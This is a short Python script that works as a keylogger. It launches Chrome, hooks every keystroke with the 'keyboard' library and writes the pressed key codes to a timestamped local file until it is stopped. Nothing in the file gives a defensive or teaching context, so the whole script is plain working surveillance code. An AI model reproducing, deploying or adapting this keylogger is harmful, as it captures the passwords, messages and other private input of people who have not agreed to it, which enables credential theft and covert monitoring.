import sys
import datetime
sys.path.append('..')
import keyboard,os
now = datetime.datetime.now()
nam = now.strftime("%d-%m-%Y-%H-%M")
name = str("files/keys-")+str(nam)+".txt"
file=open(name, 'a+')
os.system('"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"')
def print_pressed_keys(e):
        for code in keyboard._pressed_events:
                file.write(str(code)+"\n")
                file.flush()	
keyboard.hook(print_pressed_keys)
keyboard.wait()
